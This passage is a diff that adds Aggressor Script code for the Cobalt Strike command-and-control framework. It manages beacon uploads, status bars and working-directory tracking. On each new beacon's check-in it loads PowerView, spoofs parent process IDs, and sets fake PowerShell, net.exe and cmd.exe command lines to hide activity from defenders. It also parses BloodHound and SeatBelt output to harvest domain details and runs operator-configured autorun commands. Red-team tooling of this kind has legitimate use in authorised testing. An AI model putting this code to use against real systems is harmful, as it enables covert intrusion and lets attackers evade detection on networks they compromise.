+    else if($s < long(1024L * 1024L * 1024L)) { 
+        $size = long(round(($s / 1024.0) / 1024, 1)); 
+        $size .= "MB";
+    }
+    else if($s < long(1024L * 1024L * 1024L * 1024L)) { 
+        $size = long(round((($s / 1024.0) / 1024) / 1024, 1)); 
+        $size .= "GB";
+    }
+
+    return $size;
+}
+
+alias upload {
+    local('$bid $f $localpath $remotepath $content');
+    ($bid, $localpath, $remotepath) = @_;
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose a file", $null, false, lambda({
+            fireAlias($bid, "upload", $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($1, "Source file path (local path) must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        berror($1, "Specified input file does not exist: ( $+ $localpath $+ )");
+        return;
+    }
+
+    try {
+        $f = openf($localpath);
+        $content = readb($f, -1);
+        if($content is $null) {
+            throw "Read empty file";
+        }
+        closef($f);
+    }
+    catch $message { 
+        berror($1, "Could not read contents of file to upload. Error: $message");
+        return;
+    }
+
+    $algo = "MD5";
+    $md = [java.security.MessageDigest getInstance: $algo];
+    $digest = [$md digest: $content];
+
+    $hash = transform($digest, "hex");
+    $hash = lc($hash);
+
+
+    if($remotepath is $null || strlen($remotepath) == 0) {
+        $remotepath = getFileName($localpath);
+        btask($1, "Tasked Beacon to upload file (size: " . interpretSize(strlen($content)) . ", md5: " . $hash . ") from: ( $+ $localpath $+ ) to: ( $+ $remotepath $+ )");
+        bupload!($bid, $localpath);
+        return;
+    }
+
+    btask($1, "Tasked Beacon to upload file (size: " . interpretSize(strlen($content)) . ", md5: " . $hash . ") from: ( $+ $localpath $+ ) to: ( $+ $remotepath $+ )");
+    bupload_raw!($1, $remotepath, $content, $localpath);
+}
+
+set BEACON_SBAR_LEFT { 
+    local('$hostname $username $pid $arch $pwd');
+    $hostname = $2["computer"];
+    $username = $2["user"];
+    $pid = $2["pid"];
+    $arch = $2["arch"];
+    $pwd = %OPERATING_BEACONS[$1]['cwd'];
+
+    return "[\c2 $+ $hostname $+ \o] $username $+ / $+ $pid \cE( $+ $arch $+ )\o\c2 $pwd \o";
+}
+
+set BEACON_SBAR_RIGHT { 
+    local('$note $last $x $bnote');
+    $note = arsenal::_removeNote($1, "(cwd)");
+    if($note eq "()") { 
+        $note = "";
+    }
+    $last = $2["lastf"];
+    $bnote = binfo($1, "note");
+
+    return "\c6 $bnote $note \cE(last: $+ $[5]last $+ )\o";
+}
+
+set EVENT_SBAR_RIGHT {
+    local('$beacons');
+    $beacons = size(beacons());
+
+    this('$publicIP $privateIP');
+    $privateIP = localip();
+    if($publicIP is $null) {
+        $publicIP = arsenal::httpRequest("GET", "https://ipecho.net/plain", "");
+        #elog("Teamserver public IPv4 address: $publicIP");
+    }
+    
+    if(($publicIP) && (strlen($publicIP) > 0)) {
+        return "[TeamServer IP:\c6 $privateIP / $publicIP \o| \c4Beacons: $beacons\o | lag: $1 $+ ]";
+    }
+    else {
+        return "[TeamServer IP:\c6 $privateIP \o| \c4Beacons: $beacons\o | lag: $1 $+ ]";
+    }
+}
+
+#set BEACON_ERROR {
+#    if( $2 ismatch '^Unknown command: $') {
+#        # Supress Unknown command error when no command was given.
+#        return "";
+#    }
+#
+#    return "\c4[-]\o $2";
+#}
+
+set BEACON_CHECKIN {
+    return "\c9[+]\o \cE[" . dstamp($3) . "]\o $2";
+}
+
+set BEACON_OUTPUT_ALT {
+    local('$pwd');
+
+    if($2 ismatch 'Current directory is (.+)') {
+        $pwd = matched()[0];
+        %OPERATING_BEACONS[$1]['prev-cwd'] = %OPERATING_BEACONS[$1]['cwd'];
+        %OPERATING_BEACONS[$1]['cwd'] = $pwd;
+        arsenal::appendNote($1, "(cwd: \" $+ $pwd $+ \")");
+        return "\cC[*]\o Current directory is \cC" . $pwd . "\o\n";
+    }
+
+    return "\cC[*]\o $2\n";
+}
+
+alias cd {
+    local('$p');
+
+    $p = substr($0, strlen("cd "));
+
+    if(($p eq "-") && (strlen(%OPERATING_BEACONS[$1]['prev-cwd']) > 0)) {
+        bcd($1, %OPERATING_BEACONS[$1]['prev-cwd']);
+        return;
+    }
+
+    bcd($1, $p);
+}
+
+on beacon_tasked {
+    local('$pwd $sep');
+
+    if('cd *' iswm $2) {
+        $pwd = substr($2, strlen("cd "));
+        $sep = iff(binfo($1, "os") eq "Windows", "\\", "/");
+
+        if($pwd eq "..") {
+            $pwd = substr(%OPERATING_BEACONS[$1]['cwd'], 0, lindexOf(%OPERATING_BEACONS[$1]['cwd'], $sep));
+            
+            if($pwd eq "..") {
+                return "\cC[*]\o $2";
+            }
+        }
+        else if($pwd eq ".") {
+            return "\cC[*]\o $2";
+        }
+        else if((strlen($pwd) >= 2) && (charAt($pwd, 1) ne ":")) {
+            # relative path?
+            $pwd = %OPERATING_BEACONS[$1]['cwd'] . $sep . $pwd;
+        }
+
+        %OPERATING_BEACONS[$1]['prev-cwd'] = %OPERATING_BEACONS[$1]['cwd'];
+        %OPERATING_BEACONS[$1]['cwd'] = $pwd;
+        arsenal::appendNote($1, "(cwd: \" $+ $pwd $+ \")");
+
+        return "\cC[*]\o $2";
+    }
+}
+
+on beacon_output_ls {
+    local('$pwd');
+
+    if(%OPERATING_BEACONS[$1]['cwd-use-ls'] == 1) {
+        $pwd = split("\n", ["$2" trim])[0];
+        if(right($pwd, 2) eq "\\*") {
+            $pwd = substr($pwd, 0, -2);
+        }
+        %OPERATING_BEACONS[$1]['prev-cwd'] = %OPERATING_BEACONS[$1]['cwd'];
+        %OPERATING_BEACONS[$1]['cwd'] = $pwd;
+        %OPERATING_BEACONS[$1]['cwd-use-ls'] = 0;
+        arsenal::appendNote($1, "(cwd: \" $+ $pwd $+ \")");
+    }
+}
+
+on beacons {
+    local('$b $note $p $cwd $p2 $updated');
+    if(%OPERATING_BEACONS is $null) {
+        %OPERATING_BEACONS = %();
+    }
+
+    $updated = 0;
+
+    foreach $b ($1) {
+        if(iff($b !isin keys(%OPERATING_BEACONS), "true", $null)) {
+            $note = arsenal::getnote($b);
+
+            %OPERATING_BEACONS[$b] = %();
+            %OPERATING_BEACONS[$b]['jobs'] = @();
+            %OPERATING_BEACONS[$b]['cwd-use-ls'] = 0;
+            %OPERATING_BEACONS[$b]['initial-check-in'] = "";
+
+            if($note ismatch '\Wppid: (\d+)\W') {
+                %OPERATING_BEACONS[$b]['autoppid'] = matched()[0];
+            }
+
+            if($note ismatch '\Wdomain: ([^\s;:\)]+)') {
+                %OPERATING_BEACONS[$b]['domain'] = matched()[0];
+            }
+
+            if($note ismatch '\Wdomain: ([^\s;:\)]+)') {
+                %OPERATING_BEACONS[$b]['domain'] = matched()[0];
+            }
+
+            $p = indexOf($note, "cwd: ");
+            if($p) {
+                $p += strlen("cwd: \"");
+                $p2 = indexOf($note, '"', $p);
+                $cwd = substr($note, $p, $p2);
+                %OPERATING_BEACONS[$b]['cwd'] = $cwd;
+            }
+
+            $updated = 1;
+        }
+    }
+
+    if($updated == 1) {
+        saveBeaconsMetadataCache();
+    }
+}
+
+on beacon_error {
+    local('$b $ppid $err');
+
+    if ($2 ismatch 'Could not set PPID to (\d+): (\d+)') {
+        ($ppid, $err) = matched();
+
+        if((%arsenal::defaults["use_autoppid"] eq "true")) {
+            if($err == 87) {
+                blog2($1, "Catched PPID error: \c4Previous parent process no longer exists\o. Finding a new one...");
+                fireAlias($1, "autoppid", "quiet");
+            }
+            else if($err == 5) {
+                blog2($1, "Catched PPID error:\c4 $err $+ \o. Access Denied. Don't know how to proceed. Reseting PPID to none.");
+                bppid($1, 0);
+            }
+            else {
+                blog2($1, "Catched PPID error:\c4 $err $+ \o. Will find another candidate for PPID spoofing.");
+                fireAlias($1, "autoppid", "quiet");
+            }
+        }
+        else {
+            blog2($1, "Catched PPID ( $+ $ppid $+ ) error: $err $+ . Reseting PPID to none.");
+            bppid($1, 0);
+        }
+
+        blog2($1, "\c8Repeat your last command as it failed.\o");
+    }
+}
+
+#
+# beacon_output kicks in when Beacon responds with some post-ex jobs outputs,
+# e.g. "[+] received output: " ones.
+#
+on beacon_output {
+    local('$bid $beaconOutput $domain $bloodhound_results_pattern');
+    $bid = $1;
+
+    $beaconOutput = replace($2, "received output:\n", "");
+
+    $bloodhound_results_pattern = "You can upload this file directly to the UI";
+    $seatBeltDomainName = "  Domain Name                   :  ";
+    $customDomainName = "JoinedDomainName : ( ";
+
+    if ($bloodhound_results_pattern isin $beaconOutput) {
+        arsenal::parseBloodhoundOutput($bid, $beaconOutput);
+    }
+    else if ($seatBeltDomainName isin $beaconOutput) {
+        arsenal::parseSeatBeltOutput($bid, $beaconOutput);
+    }
+    else if ($customDomainName isin $beaconOutput) {
+        $domain = arsenal::extractString($beaconOutput, $customDomainName, " )");
+        if (strlen($domain) > 0 ) {
+            $domainName = ["$domain" trim];
+            if($bid in keys(%OPERATING_BEACONS)) { 
+                %OPERATING_BEACONS[$bid]["domain"] = $domainName; 
+            }
+            arsenal::appendNote($bid, "(domain: $domainName $+ )");
+        }
+    } 
+}
+
+
+#
+# On the other hand, beacon_output_alt is fired when Beacon tasked actions responses are generated
+# by Cobalt Strike, such as: "[*] download of <file> is complete."
+#
+on beacon_output_alt {
+    local('$completed_download $bloodhound_results_pattern $bid $beaconOutput');
+    $bid = $1;
+    $beaconOutput = $2;
+
+    $completed_download = "download of * is complete";
+    $bloodhound_results_pattern = "_BloodHound.zip is complete";
+
+    if ($completed_download iswm $beaconOutput) {
+        if ($bloodhound_results_pattern isin $beaconOutput) {
+            arsenal::removeStaleBloodhoundResults($bid, $beaconOutput);
+        }
+        
+        arsenal::syncDownloadedFiles("auto");
+    }
+}
+
+on beacon_output_jobs {
+    local('$bid @jobs $j @o');
+    $bid = $1;
+    @jobs = split("\n", $2);
+
+    %OPERATING_BEACONS[$bid]['jobs'] = @();
+    foreach $job (@jobs) {
+        if(strlen($job) == 0) {
+            continue;
+        }
+
+        @o = split("\\s+", $job);
+        $j = @o[0] . " - " . @o[1] . " - " . join(' ', sublist(@o, 2));
+        add(%OPERATING_BEACONS[$bid]['jobs'], $j);
+    }
+
+    if(size(@jobs) > 0) {
+        saveBeaconsMetadataCache();
+    }
+}
+
+on beacon_initial {
+    local('$fakePowershellCommandline @arr $firstSeen');
+
+    bpwd($1);
+
+    if(%arsenal::defaults["collect_domain_name"] eq "true") {  
+        fireAlias($1, "getdomain", "");
+    }
+
+    if($1 in keys(%OPERATING_BEACONS)) {
+        if("initial-check-in" in keys(%OPERATING_BEACONS[$1]) && strlen(%OPERATING_BEACONS[$1]["initial-check-in"]) > 0) {
+            $firstSeen = "First seen: ( $+ " . %OPERATING_BEACONS[$1]["initial-check-in"] . " $+ ). ";
+            #blog($1, "Beacon ( $+ $1 $+ ) already initialized. $firstSeen $+ Skipping initial actions...");
+            arsenal::note($1, %OPERATING_BEACONS[$1]["notes"]);
+            return;
+        }
+    }
+
+    if($1 !in keys(%OPERATING_BEACONS)) {
+        %OPERATING_BEACONS[$1] = %();
+    }
+
+    %OPERATING_BEACONS[$1]["initial-check-in"] = dstamp(ticks());
+
+    arsenal::appendNote($1, "(checked-in: [" . size(%OPERATING_BEACONS) . "] " . %OPERATING_BEACONS[$1]["initial-check-in"] . ")");
+
+
+    if(%arsenal::defaults["beacon_initial_actions"] eq "true") {  
+        fireAlias($1, "import-powerview", "");
+
+        if(%arsenal::defaults["use_autoppid"] eq "true") {
+            # Parent PID spoofing
+            fireAlias($1, "autoppid", "");
+        }
+
+        # -----------------------------------------------
+        # Setup argue list - command line spoofing entries
+
+        if (%arsenal::defaults["preset_argue_fake_cmdlines"] eq "true") {
+            #
+            # POWERSHELL
+            #
+
+            $fakePowershellCommandline = "Get-WmiObject -Class ccm_application -Namespace root\\ccm\\clientsdk -ComputerName (get-content C:\\Windows\\System32\\drivers\\etc\\hosts) | Where-Object { (\$_.InstallState -ne \"Installed\") -and (\$_.ApplicabilityState -eq \"Applicable\") -and (\$_.IsMachineTarget -eq \$True) -and (\$_.EvaluationState -ne 1)} | select FullName,__SERVER ; Get-WMIobject win32_networkadapterconfiguration | where {\$_.IPEnabled -eq \"True\"} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto ; Get-EventLog -log system -newest 1000 | where-object {\$_.eventid -eq '1074'} | format-table machinename, username, timegenerated -autosize";
+
+            # +/- 2100 characters
+            $fakePowershellCommandline = $fakePowershellCommandline . ";" . $fakePowershellCommandline . ";" . $fakePowershellCommandline;
+
+            bargue_add!($1, "powershell", $fakePowershellCommandline);
+            bargue_add!($1, "powershell.exe", $fakePowershellCommandline);
+            bargue_add!($1, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", $fakePowershellCommandline);
+
+            #
+            # NET.EXE
+            #
+
+            bargue_add!($1, "net", "statistics workstation");
+            bargue_add!($1, "net.exe", "statistics workstation");
+            bargue_add!($1, "C:\\Windows\\System32\\net.exe", "statistics workstation");
+
+            #
+            # CMD.EXE
+            #
+
+            bargue_add!($1, "cmd", "/Q /E:OFF /V:OFF /C \"C:\\Windows\\System32\\wscript.exe c:\\windows\\system32\\gathernetworkinfo.vbs\"");
+            bargue_add!($1, "%COMSPEC%", "/Q /E:OFF /V:OFF /C \"C:\\Windows\\System32\\wscript.exe c:\\windows\\system32\\gathernetworkinfo.vbs\"");
+            bargue_add!($1, "cmd.exe", "/Q /E:OFF /V:OFF /C \"C:\\Windows\\System32\\wscript.exe c:\\windows\\system32\\gathernetworkinfo.vbs\"");
+            bargue_add!($1, "C:\\Windows\\System32\\cmd.exe", "/Q /E:OFF /V:OFF /C \"C:\\Windows\\System32\\wscript.exe c:\\windows\\system32\\gathernetworkinfo.vbs\"");
+        }
+
+        # -----------------------------------------------
+        @params = @(
+            'autorun_command_on_initial_checkin1',
+            'autorun_command_on_initial_checkin2',
+            'autorun_command_on_initial_checkin3',
+            'autorun_command_on_initial_checkin4',
+            'autorun_command_on_initial_checkin5',
+            'autorun_command_on_initial_checkin6',
+        );
+
+        foreach $p (@params) {
+            if(%arsenal::defaults[$p] !is $null && strlen(%arsenal::defaults[$p]) > 0) {
+                beacon_task($1, %arsenal::defaults[$p]);
+            }
+        }
+
+        if(%arsenal::defaults["custom_argue_on_initial_checkin1"] !is $null && strlen(%arsenal::defaults["custom_argue_on_initial_checkin1"]) > 0) {
+            beacon_task($1, "argue " . %arsenal::defaults["custom_argue_on_initial_checkin1"]);
+        }
+        if(%arsenal::defaults["custom_argue_on_initial_checkin2"] !is $null && strlen(%arsenal::defaults["custom_argue_on_initial_checkin2"]) > 0) {
+            beacon_task($1, "argue " . %arsenal::defaults["custom_argue_on_initial_checkin2"]);
+        }
+        if(%arsenal::defaults["custom_argue_on_initial_checkin3"] !is $null && strlen(%arsenal::defaults["custom_argue_on_initial_checkin3"]) > 0) {
+            beacon_task($1, "argue " . %arsenal::defaults["custom_argue_on_initial_checkin3"]);
+        }
+
+        blog!($1, "PowerView pre-loaded.");
+    }
+    else {
+        arsenal::debug("On Beacon initial checkin automated actions disabled due to options setting.");
+    }
+
+    saveBeaconsMetadataCache();
+}
+
+on beacon_input {
+    local('$b $notes');
+
+    if (["$3" trim] eq "ls") {
+        %OPERATING_BEACONS[$1]['cwd-use-ls'] = 1;
+    }
+    else if ($3 eq "exit") {
+        if($1 in keys(%OPERATING_BEACONS)) { %OPERATING_BEACONS[$1]["exited"] = dstamp(ticks()); }
+        arsenal::insertNote($1, "(EXIT)");
+        $b = "(id: " . $1 . ", user: " . binfo($1, "computer") . "\\" . binfo($1, "user") . ", " . binfo($1, "internal") . "@" . binfo($1, "pid") . ")";
+        elog("Tasked Beacon $b to exit.");
+        #remove(%OPERATING_BEACONS, $1);
+    }
+    else if ($3 ismatch '^sleep (\d+)(?: (\d+))?') {
+        ($sec, $jit) = matched();
+        if (($jit is $null) || ($jit eq "")) {
+            arsenal::appendNote($1, "(sleep: $sec $+ )");
+        }
+        else {
+            arsenal::appendNote($1, "(sleep: $sec $+ , jit: $jit $+ )");
+        }
+    }
+    #else if ($3 ismatch '^note (.+)') {
+    #    $notes = matched()[0];
+    #    if($1 in keys(%OPERATING_BEACONS)) { 
+    #        arsenal::note($1, $notes . " " . arsenal::getnote($1)); 
+    #    }
+    #}
+}
+
+on heartbeat_15s {
+    if(%arsenal::defaults["beacon_tab_name_format"] is $null || strlen(%arsenal::defaults["beacon_tab_name_format"]) == 0) {
+        return;
+    }
+
+    arsenal::renameBeaconTabs();
+}
+
+getOptions();
+arsenal::renameBeaconTabs();
+
+checkStracciatella();
+arsenal::debug("Straciatella available: $stracciatellaAvailable");
